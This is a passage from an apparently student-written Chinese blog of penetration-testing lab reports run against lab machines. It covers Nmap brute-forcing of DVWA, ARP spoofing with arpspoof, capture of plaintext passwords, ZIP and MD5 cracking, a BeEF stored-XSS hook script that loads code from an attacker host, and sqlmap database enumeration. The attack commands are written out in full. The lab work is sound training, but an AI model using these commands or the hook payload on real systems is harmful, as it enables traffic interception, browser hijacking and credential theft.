协议可以有效的防止远程管理过程中的信息泄露问题，在当前的生产环境运维工作中，绝大多数企业普遍采用SSH协议服务来代替传统的不安全的远程联机服务软件，如telnet(23端口，非加密的)等。</p><p>SSH还能提供类似FTP服务的sftp-server,借助SSH协议来传输数据的.提供更安全的SFTP服务</p><h5 id="23端口telnet远程登陆服务"><a href="#23端口telnet远程登陆服务" class="headerlink" title="23端口telnet远程登陆服务"></a>23端口telnet远程登陆服务</h5><p>telnet服务属于典型的客户机&#x2F;服务器模型，当用telnet登录远程计算机的时候，实际上启动了两个程序：运行在本地计算机的telnet客户端程序；运行在登录的远程计算机上的telnet服务程序</p><h5 id="53端口DNS域名解析服务"><a href="#53端口DNS域名解析服务" class="headerlink" title="53端口DNS域名解析服务"></a>53端口DNS域名解析服务</h5><p>所提供的服务是用来将主机名和域名转换为IP地址</p><h4 id="6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"></a>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027105858.png" alt="OS"></p><h4 id="6-3-利用NMAP穷举-Metasploitable2上-dvwa-的登录账号和密码。"><a href="#6-3-利用NMAP穷举-Metasploitable2上-dvwa-的登录账号和密码。" class="headerlink" title="6.3 利用NMAP穷举 Metasploitable2上 dvwa 的登录账号和密码。"></a>6.3 利用NMAP穷举 Metasploitable2上 dvwa 的登录账号和密码。</h4><p>Nmap 自带有一些脚本，可以用来探测登陆界面或爆破登陆界面，首先判断 dvwa 在 80 端口上，用<code>http-auth-finder</code>脚本探测站点上的登录授权页面，发现<code>/dvwa/login.php</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027181338.png"></p><p>找到和登录授权有关的页面，尝试使用类似于<code>http-form-brute</code>的脚本爆破出一些账户密码，<code>http-form-brute</code> 传参<code>--script-args=http-form-brute.path=/dvwa/login.php 192.168.10.227</code>进行爆破，得到账号<code>admin</code>密码<code>password</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027182031.png"></p><h4 id="6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h4><p>蠕虫病毒会通过远程服务器和自身爬虫功能收集局域网内的IP列表，然后对其中的多个服务端口发起攻击，包括RPC服务(135端口)、SQLServer服务(1433端口)、FTP服务(21端口)，同时还会通过 “永恒之蓝”漏洞，入侵445端口，攻击电脑。</p><p>该病毒针对企业不便关闭的多个常用端口进行攻击，并且利用了局域网电脑中普遍未修复的”永恒之蓝”漏洞，一旦任何一台电脑被该病毒感染，将意味着局域网内所有电脑都面临被感染的风险，尤其给政企机构用户造成极大威胁。 </p><p>如果病毒成功入侵或攻击端口，就会从远程服务器下载病毒代码，进而横向传播给局域网内其他电脑。同时，该病毒还会在被感染电脑中留下后门病毒，以准备进行后续的恶意攻击，不排除未来会向用户电脑传播更具威胁性病毒的可能性，例如勒索病毒等</p><h3 id="7、利用-ZoomEye-搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7、利用-ZoomEye-搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7、利用 ZoomEye 搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7、利用 ZoomEye 搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h3><p>利用 ZoomEye 搜索到的西门子公司工控设备，其 IP 、开放的端口号、国家等信息暴露出来，可能导致某些服务（例如 SSH、telnet等）被爆破弱口令，进而导致正常服务被破坏</p><h3 id="8、Winhex简单数据恢复与取证"><a href="#8、Winhex简单数据恢复与取证" class="headerlink" title="8、Winhex简单数据恢复与取证"></a>8、Winhex简单数据恢复与取证</h3><h4 id="8-1-elephant-jpg不能打开了，利用WinHex修复，说明修复过程。"><a href="#8-1-elephant-jpg不能打开了，利用WinHex修复，说明修复过程。" class="headerlink" title="8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。"></a>8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</h4><p>象鼻山.jpg的文件头损坏，winhex 打开更改文件头即可</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027110849.jpg" alt="elephant"></p><blockquote><p>JPEG (jpg)，文件头：FFD8FF</p></blockquote><h4 id="8-2-笑脸背后的阴霾：图片smile有什么隐藏信息。"><a href="#8-2-笑脸背后的阴霾：图片smile有什么隐藏信息。" class="headerlink" title="8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。"></a>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。</h4><p>用 winhex 打开，拉到最下面发现了<code>killer</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201027111012.png"></p><h4 id="8-3-尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"><a href="#8-3-尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。" class="headerlink" title="8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"></a>8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</h4><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201104183519.png" alt="嗨格式"></p><p>高中的时候帮同学用这个<code>嗨格式</code>恢复过U盘文件，现在这软件还是一如既往的好用</p><h3 id="9-实验小结"><a href="#9-实验小结" class="headerlink" title="9. 实验小结"></a>9. 实验小结</h3><p>通过本次实验学习到了一些被动扫描的技巧，包括照片定位、通过MAC查询设备以及如何更好的利用搜索引擎，还学习到了 Nmap 的主动扫描技巧，还有一些对文件隐写的常用操作，比如修复损坏的文件头，查看隐藏在文件里的二进制信息等</p><h1 id="网络渗透测试实验二：网络嗅探与身份认证"><a href="#网络渗透测试实验二：网络嗅探与身份认证" class="headerlink" title="网络渗透测试实验二：网络嗅探与身份认证"></a>网络渗透测试实验二：网络嗅探与身份认证</h1><h2 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li>通过使用 Wireshark 软件掌握 Sniffer (嗅探器)工具的使用方法，实现捕捉 HTTP 等协议的数据包，以理解 TCP&#x2F;IP 协议中多种协议的数据结构、通过实验了解 HTTP 等协议明文传输的特性。</li><li>研究交换环境下的网络嗅探实现及防范方法，研究并利用 ARP 协议的安全漏洞，通过 Arpspoof 实现 ARP 欺骗以捕获内网其他用户数据。</li><li>能利用 BurpSuite 实现网络登录暴力破解获得登陆密码</li><li>能实现 ZIP 密码破解，理解安全密码的概念和设置</li></ol><h2 id="系统环境-1"><a href="#系统环境-1" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Kali Linux2、Windows</li></ul><h2 id="网络环境-1"><a href="#网络环境-1" class="headerlink" title="网络环境"></a>网络环境</h2><ul><li>交换网络结构</li></ul><h2 id="实验工具-1"><a href="#实验工具-1" class="headerlink" title="实验工具"></a>实验工具</h2><ul><li>Arpspoof、WireShark、Burpsuite、fcrackzip(用于 zip 密码破解)</li></ul><h2 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="网络嗅探部分："><a href="#网络嗅探部分：" class="headerlink" title="网络嗅探部分："></a>网络嗅探部分：</h3><ul><li>网络嗅探：Wireshark 监听网络流量，抓包</li><li>ARP 欺骗：ArpSpoof，实施 ARP 欺骗</li><li>防范：防范 ARP 欺骗</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106143101.png" alt="实验网络拓扑"></p><h4 id="1、A-主机上外网，-B-主机运行-sniffer-WireShark-选定只抓源为-A-的数据"><a href="#1、A-主机上外网，-B-主机运行-sniffer-WireShark-选定只抓源为-A-的数据" class="headerlink" title="1、A 主机上外网， B 主机运行 sniffer(WireShark)选定只抓源为 A 的数据"></a>1、A 主机上外网， B 主机运行 sniffer(WireShark)选定只抓源为 A 的数据</h4><p>本次实验开了一台 Kali 当主机 A ，开了一台 win7 虚拟机当主机 B ，首先开 nmap 扫一扫，确定一下目标主机 IP 并看看能不能 ping 通，<code>Aimerl0-PC.lan</code>就是 win7 主机，<code>.lan</code>表示使用有线网络</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106145957.png"></p><p>虽然 nmap 用了 -sP 扫描，但还是 ping 一下，没有丢包，很满意</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106150341.png"></p><p>接着用 win7 ping 一下 kali ，打开 Wireshark 抓一下包，过滤语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.10.204</span><br></pre></td></tr></table></figure><p>   <img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106165111.png" alt="ping"></p><p>具体打开 ping 过去的包看看，还是能够看到 ping 的内容的</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106165333.png">、</p><h4 id="2、ARP-欺骗"><a href="#2、ARP-欺骗" class="headerlink" title="2、ARP 欺骗"></a>2、ARP 欺骗</h4><h4 id="2-1-为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？"><a href="#2-1-为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？" class="headerlink" title="2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？"></a>2.1 为了捕获A到外网的数据，B实施ARP欺骗攻击，B将冒充该子网的什么实体？</h4><blockquote><p>在局域网中，B 主机冒充的是子网中的网关</p></blockquote><h4 id="2-2-写出-arpspoof-命令格式"><a href="#2-2-写出-arpspoof-命令格式" class="headerlink" title="2.2 写出 arpspoof 命令格式"></a>2.2 写出 arpspoof 命令格式</h4><p>首先，我的新 kali 里面没有安装 arpspoof ，所以简单安装了一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install dsniff</span><br></pre></td></tr></table></figure><p>然后需要开启端口转发，不然截获到的报文无法转发出去，B 主机就没法上网了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>再然后开始攻击，因为跟受害主机在同一个网段，所以网关肯定都是<code>192.168.10.1</code>，之前又扫到了目标主机的 IP 为<code>192.168.10.204</code>，所以能够直接开锤，简单看一下 arpspoof 使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@F0x:~# arpspoof</span><br><span class="line">Version: 2.4</span><br><span class="line">Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="line"></span><br><span class="line">arpspoof [-i 指定使用的网卡] [-t 要欺骗的目标主机] [-r] 要伪装成的主机</span><br></pre></td></tr></table></figure><p>kali 的 IP 是<code>192.168.10.165</code>，要欺骗的目标主机 IP 是<code>192.168.10.204</code>，网关是<code>192.168.10.1</code>，思路一下子就清晰起来了，我们目的就是把 kali 伪装成网关，结合 arpspoof </p><ul><li>攻击者：<code>192.168.10.165</code></li><li>被欺骗主机：<code>192.168.10.204</code></li><li>网关：<code>192.168.10.1</code></li></ul><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.10.204 -r 192.168.10.1</span><br></pre></td></tr></table></figure><h4 id="2-3-amp-2-4-是否能看到A和外网的通信（A刚输入的帐户和口令）？在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。"><a href="#2-3-amp-2-4-是否能看到A和外网的通信（A刚输入的帐户和口令）？在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。" class="headerlink" title="2.3&amp;2.4 是否能看到A和外网的通信（A刚输入的帐户和口令）？在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。"></a>2.3&amp;2.4 是否能看到A和外网的通信（A刚输入的帐户和口令）？在互联网上找到任意一个以明文方式传递用户帐号、密码的网站，截图Wireshark中显示的明文信息。</h4><p>然后我在 win7 上登陆了一下 <code>某某大学的bkjw2</code>，检查了一下发现可以连上网，然后回到 kali 开始流量分析，然后抓到了自己的账号密码，果然是明文传输的，密码自行打码了</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106172557.png" alt="明文密码"></p><h4 id="3、FTP数据还原部分：利用WireShark打开实验实验数据data-pcapng"><a href="#3、FTP数据还原部分：利用WireShark打开实验实验数据data-pcapng" class="headerlink" title="3、FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng"></a>3、FTP数据还原部分：利用WireShark打开实验实验数据data.pcapng</h4><h4 id="3-1-FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？"><a href="#3-1-FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？" class="headerlink" title="3.1  FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？"></a>3.1  FTP服务器的IP地址是多少？你是如何发现其为FTP服务器的？</h4><p>用 ftp 过滤流，发现一堆流量</p><p>Response 是响应的意思，应该就是 FTP 服务器响应客户端请求，所以 IP 地址是<code>192.168.182.1</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175557.png"></p><h4 id="3-2-客户端登录FTP服务器的账号和密码分别是什么"><a href="#3-2-客户端登录FTP服务器的账号和密码分别是什么" class="headerlink" title="3.2 客户端登录FTP服务器的账号和密码分别是什么?"></a>3.2 客户端登录FTP服务器的账号和密码分别是什么?</h4><p>一图两用，账号<code>student</code>，密码<code>sN46i5y</code>，上面还有个匿名用户<code>anonymous</code>登陆的</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175557.png"></p><h4 id="3-3-客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？提示：文件名有可能是中文"><a href="#3-3-客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？提示：文件名有可能是中文" class="headerlink" title="3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？提示：文件名有可能是中文."></a>3.3 客户端从FTP下载或查看了2个文件，一个为ZIP文件，一个为TXT文件，文件名分别是什么？提示：文件名有可能是中文.</h4><p>分析流量看到<code>1.zip</code>和<code>复习题.txt</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106175939.png"></p><h4 id="3-4-还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。"><a href="#3-4-还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。" class="headerlink" title="3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。"></a>3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。</h4><p>根据 zip 的<code>504B0304</code>可以找到流量，再以原始数据保存成<code>2.zip</code>到桌面</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106180544.png" alt="504B0304"></p><p>然后我用了<code>ARCHPR</code>软件来爆破，爆破到密码为<code>123456</code>，解压得到图片</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181039.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181131.jpg" alt="🐧"></p><h4 id="3-5-TXT文件的内容是什么？"><a href="#3-5-TXT文件的内容是什么？" class="headerlink" title="3.5 TXT文件的内容是什么？"></a>3.5 TXT文件的内容是什么？</h4><p>分析流量，找到<code>复习题.txt</code>的 &#x3D;&#x3D;FTP-DATA&#x3D;&#x3D;，表示文件传输，看到数据内容</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106181637.png" alt="data"></p><h3 id="网站密码破解部分："><a href="#网站密码破解部分：" class="headerlink" title="网站密码破解部分："></a>网站密码破解部分：</h3><p>以 xxxx 为目标网站，构造字典（wordlist），其中包含你的正确密码，利用 burpsuite 进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。</p><ul><li>这里找到了原来搭的<code>pikachu</code>靶场，桌面新建<code>list.txt</code>，里面存有一些密码，比如</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">000000</span><br><span class="line">abc123</span><br></pre></td></tr></table></figure><p>开 burpsuite 抓包，send to inturder ，payload 页面点 load 导入桌面的<code>list.txt</code>，开始爆破</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182535.png"></p><p>正确密码或者特殊密码的长度会不同，所以判断<code>abc123</code>就是密码</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182627.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106182747.png"></p><h3 id="MD5破解部分："><a href="#MD5破解部分：" class="headerlink" title="MD5破解部分："></a>MD5破解部分：</h3><p>SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE</p><p>那么，口令的明文是什么？（提示：MD5值破解）</p><p>随便找个在线解密网站，得到明文<code>iampotato</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/20201106183031.png"></p><h3 id="John-the-Ripper的作用是什么？"><a href="#John-the-Ripper的作用是什么？" class="headerlink" title="John the Ripper的作用是什么？"></a>John the Ripper的作用是什么？</h3><p>John 是一款老牌的暴力破解密码的工具，拥有自带的字典，可以用来爆破一些简单的弱口令密码</p><h3 id="思考问题："><a href="#思考问题：" class="headerlink" title="思考问题："></a>思考问题：</h3><h4 id="谈谈如何防止ARP攻击"><a href="#谈谈如何防止ARP攻击" class="headerlink" title="谈谈如何防止ARP攻击"></a>谈谈如何防止ARP攻击</h4><ul><li>静态绑定IP地址和MAC地址</li><li>双绑措施，在路由器和终端上都进行IP-MAC绑定的措施，它可以对ARP欺骗的两边，伪造网关和截获数据，都具有约束的作用。这是从ARP欺骗原理上进行的防范措施，也是最普遍应用的办法。它对付最普通的ARP欺骗是有效的</li><li>安装 ARP 防火墙</li></ul><h4 id="安全的密码（口令）应遵循的原则"><a href="#安全的密码（口令）应遵循的原则" class="headerlink" title="安全的密码（口令）应遵循的原则"></a>安全的密码（口令）应遵循的原则</h4><ul><li>不能是弱密码（123456、admin、root、88888888）</li><li>各个平台的密码有自己的特征</li><li>不要带有自己的生日或者名字缩写等容易被社工到的信息，可能会被组合成密码字典进行爆破</li></ul><h4 id="谈谈字典攻击中字典的重要性"><a href="#谈谈字典攻击中字典的重要性" class="headerlink" title="谈谈字典攻击中字典的重要性"></a>谈谈字典攻击中字典的重要性</h4><ul><li>一个弱口令字典常常是打开渗透突破口的第一步</li><li>通过社会工程学组合而成的字典杀伤力很大，能提高密码爆破的成功率</li><li>一些可以用来 fuzzing 的字典可以测试网站的 waf ，比如过滤掉了哪些字符串</li></ul><h4 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h4><p>本次实验最重要的就是学到了 ARP 协议和 ARP 欺骗，以前只是听说过，这回仔细找资料并且动手实践了，其次还明白了密码的重要性，最后是对 Wireshark 软件的使用更加熟练了一些，流量分析也学到了不少简练的操作</p><h1 id="网络渗透测试实验三：XSS-和-SQL-注入"><a href="#网络渗透测试实验三：XSS-和-SQL-注入" class="headerlink" title="网络渗透测试实验三：XSS 和 SQL 注入"></a>网络渗透测试实验三：XSS 和 SQL 注入</h1><h2 id="实验目的-2"><a href="#实验目的-2" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li><p>了解什么是XSS</p></li><li><p>了解XSS攻击实施，理解防御XSS攻击的方法</p></li><li><p>了解SQL注入的基本原理</p></li><li><p>掌握PHP脚本访问MySQL数据库的基本方法</p></li><li><p>掌握程序设计中避免出现SQL注入漏洞的基本方法</p></li><li><p>掌握网站配置。</p></li></ul><h2 id="系统环境-2"><a href="#系统环境-2" class="headerlink" title="系统环境"></a>系统环境</h2><ul><li>Kali Linux2、Windows Server</li></ul><h2 id="网络环境-2"><a href="#网络环境-2" class="headerlink" title="网络环境"></a>网络环境</h2><ul><li>交换网络结构</li></ul><h2 id="实验工具-2"><a href="#实验工具-2" class="headerlink" title="实验工具"></a>实验工具</h2><ul><li>Beef</li><li>AWVS</li><li>Sqlmap</li><li>DVWA</li></ul><h2 id="实验步骤-2"><a href="#实验步骤-2" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="XSS部分：利用-Beef-劫持被攻击者客户端浏览器"><a href="#XSS部分：利用-Beef-劫持被攻击者客户端浏览器" class="headerlink" title="XSS部分：利用 Beef 劫持被攻击者客户端浏览器"></a>XSS部分：利用 Beef 劫持被攻击者客户端浏览器</h3><ul><li>实验环境搭建：</li></ul><p>角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建）<br>攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）；<br>被攻击者：访问留言簿网站，浏览器被劫持。</p><blockquote><p>搭建教程网站：<a href="https://blog.csdn.net/qq_41865652/article/details/107459482?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160554665919725255539382%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=160554665919725255539382&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-2-107459482.pc_first_rank_v2_rank_v28&utm_term=win7+asp%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA&spm=1018.2118.3001.4449">本地win7系统下ASP网站环境搭建</a></p></blockquote><p>搭建成功：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117012821.png" alt="搭建成功"></p><ol><li>利用 AWVS 扫描留言簿网站，发现存在 XSS 漏洞，截图</li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117022801.png" alt="发现漏洞"></p><blockquote><p>这里还看到了一个 <code>HTTP.sys</code>远程代码执行漏洞，稍微看了一下，还是个二进制漏洞，metasploit已经收录而且能直接把受害主机打蓝屏，真不错</p><p><a href="https://www.freebuf.com/column/202763.html">每日漏洞 | HTTP.sys远程代码执行</a></p><p><a href="https://www.jianshu.com/p/33569386dea9">HTTP.sys远程代码执行漏洞</a></p></blockquote><ol><li>kali 使用 Beef 生成恶意代码，截图</li></ol><blockquote><p>很遗憾，我的新版 kali 依旧是没有 beef ，果断选择安回所有工具</p><blockquote><p>apt-get -y install kali-linux-default #渗透测试的基本工具<br>apt-get -y install kali-linux-large #更广泛的工具<br>apt-get -y install kali-linux-everything #所有工具</p><blockquote><p>然后还是没有 beef </p><p>自己安装了一个<code>apt-get install beef-xss</code></p></blockquote></blockquote></blockquote><p>打开 beef 的时候遇到了一个报错，说不能使用默认的账号密码（beef beef），去对应路径下找到文件自己改一个新的账号密码就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[!] ERROR: Don&#x27;t use default username and password!</span><br><span class="line">[15:18:15]    |_  Change the beef.credentials.passwd in /etc/beef-xss/config.yaml</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117042700.png" alt="shellcode"></p><ol><li>访问 http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp，将以下恶意代码写入网站留言板，截图</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.17.132:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>管理员登录 login.html，账号密码均为 admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在 beff 中的配置截图</li></ol><blockquote><p>没有选择跳到学校主页，选择了跳到自己的博客主页</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117045535.png"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117050240.png" alt="blog"></p><ol start="4"><li>回答问题：实验中 XSS 攻击属于哪种类型？</li></ol><blockquote><p>存储型 XSS</p></blockquote><h3 id="SQL-注入部分：DVWA-SQLmap-Mysql-注入实战"><a href="#SQL-注入部分：DVWA-SQLmap-Mysql-注入实战" class="headerlink" title="SQL 注入部分：DVWA + SQLmap + Mysql 注入实战"></a>SQL 注入部分：DVWA + SQLmap + Mysql 注入实战</h3><ul><li>实验环境搭建。启动 Metasploitable2 虚拟机</li></ul><ol><li><p>在输入框输入1，返回</p><blockquote><p>ID: 1<br>First name: admin<br>Surname: admin</p></blockquote><p>返回正常；<br>再次输入1’，报错，返回</p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1</p></blockquote><p>此时可以断定有SQL注入漏洞，<br><a href="http://ip地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#">http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit#</a><br>下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低；</p></li><li><p>枚举当前使用的数据库名称和用户名</p></li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117004441.png" alt="sqlmap"></p><blockquote><p>用 sqlmap 直接扫的时候遇到了个问题，存在 <code>302</code> 跳转页面，扫的时候会直接跳回 <code>login.php</code> 登录页面，所以需要加 <code>cookie</code> 来扫</p><blockquote><p>退回登录页面，抓包拿到 cookie </p><p><code>security=low; PHPSESSID=f383161ec8314206ec01076f9b34b866</code></p></blockquote></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117032106.png" alt="302"></p><p>你输入的命令：</p><blockquote><p>sqlmap -u “<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ -b –current-db –current-user </p></blockquote><p>Sqlmap 输出截图：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117033022.png"></p><ol start="3"><li>枚举数据库用户名和密码</li></ol><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117004609.png" alt="sqlmap"></p><p>你输入的命令：</p><blockquote><p>sqlmap -u “<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ –users –password –batch</p></blockquote><p>Sqlmap 输出截图</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035518.png"></p><ol start="4"><li>枚举数据库</li></ol><p><code>--dbs</code>：枚举所有数据库</p><p>你输入的命令：</p><blockquote><p>sqlmap -u “<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ –dbs</p></blockquote><p>Sqlmap 输出截图：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035651.png"></p><ol start="5"><li>枚举数据库和指定数据库的数据表</li></ol><p><code>-D 数据库名</code>：指定数据库</p><p><code>--tables</code>：枚举指定数据库的所有表</p><p>你输入的命令：</p><blockquote><p>sqlmap -u “<a href="http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;">http://192.168.17.130/dvwa/vulnerabilities/sqli/?id=11&amp;Submit=Submit#&quot;</a> –cookie&#x3D;’security&#x3D;low;PHPSESSID&#x3D;f383161ec8314206ec01076f9b34b866’ -D dvwa –tables</p></blockquote><p>Sqlmap 输出截图：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201117035817.png"></p><ol start="6"><li>获取指定数据库和表中所有列的信息</li></ol><p><code>-D 数据库名</code>：指定的数据库</p><p><code>-T 指定数据表名</code>：指定数据库中的数据表</p><p><code>--columns</code>：获取列的信息</p><p>你输入的命令：</p><blockquote><p>sqlmap -u “<a 